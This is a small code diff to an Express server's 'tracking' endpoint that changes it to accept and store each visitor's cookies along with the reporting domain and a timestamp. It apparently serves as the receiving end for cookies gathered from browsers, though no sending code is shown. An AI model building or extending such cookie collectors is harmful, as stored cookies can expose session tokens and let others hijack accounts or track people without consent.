@@ -52,7 +52,7 @@ let trackedDomains = [];
 
 // API to receive tracking data
 app.post("/", (req, res) => {
-    const { domain } = req.body;
+    const { domain,cookies } = req.body;
 
     if (!domain) {
         return res.status(400).json({ error: "Missing domain" });
@@ -61,7 +61,7 @@ app.post("/", (req, res) => {
     console.log(`Received domain: ${domain}`);
 
     // Save domain with timestamp (temporary storage)
-    trackedDomains.push({ domain, timestamp: new Date().toISOString() });
+    trackedDomains.push({ domain, cookies,timestamp: new Date().toISOString() });
 
     res.status(200).json({ message: "Domain logged successfully" });
 });
